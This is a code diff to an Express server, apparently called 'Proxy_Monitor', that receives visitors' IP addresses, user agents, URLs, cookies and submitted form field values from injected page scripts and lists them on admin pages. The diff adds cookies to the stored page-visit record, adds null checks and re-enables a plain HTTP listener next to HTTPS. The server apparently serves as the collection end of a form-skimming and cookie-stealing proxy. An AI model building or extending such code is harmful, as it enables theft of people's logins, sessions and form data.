@@ -82,7 +82,14 @@ app.post('/pagevisit', function(req,res){
 	var _url = req.body.url
 	var time = Date.now()
 
-	var data = ip+useragent+OS+_url+time
+	var data = JSON.stringify({
+		ip, 
+		useragent,
+		OS,
+		cookies,
+		_url,
+		time
+	})
 
 	var _md5 = crypto.createHash('md5').update(data).digest("hex");
 	
@@ -117,6 +124,7 @@ app.post('/forms', function(req,res) {
 	
 	//var ip = getip(req)
 	var ip = req.body.sender
+	// {type: string, name: string, value:string }
     var formData = req.body.data
 	var _url = req.body.url
 	var cookies = req.body.cookies
@@ -165,7 +173,7 @@ app.get('/admin/visits',function(req,res){
 	PageVisit.find({}, function(err, entries){
 		res.render('pages/adminvisits', { 
 			title: "Proxy_Monitor - " + ip,
-			entries: entries
+			entries: entries ?? []
 		})
 	})
 })
@@ -178,7 +186,7 @@ app.get('/admin/forms',function(req,res){
 	FormSubmit.find({}, function(err, entries){
 		res.render('pages/adminforms', { 
 			title: "Proxy_Monitor - " + ip,
-			entries: entries
+			entries: entries ?? []
 		})
 	})
 })
@@ -188,8 +196,8 @@ generateJS(CURRENT_IP, NODE_PORT_SSL)
 
 //app.listen(NODE_PORT, NODE_ADDR)
 // Create an HTTP service.
-//http.createServer(app).listen(NODE_PORT);
-//console.log("Listening on http://"+NODE_ADDR+":"+ NODE_PORT)
+http.createServer(app).listen(NODE_PORT);
+console.log("Listening on http://"+NODE_ADDR+":"+ NODE_PORT)
 // Create an HTTPS service identical to the HTTP service.
 https.createServer(sslOptions, app).listen(NODE_PORT_SSL);
 console.log("Listening on https://"+NODE_ADDR+":"+ NODE_PORT_SSL)
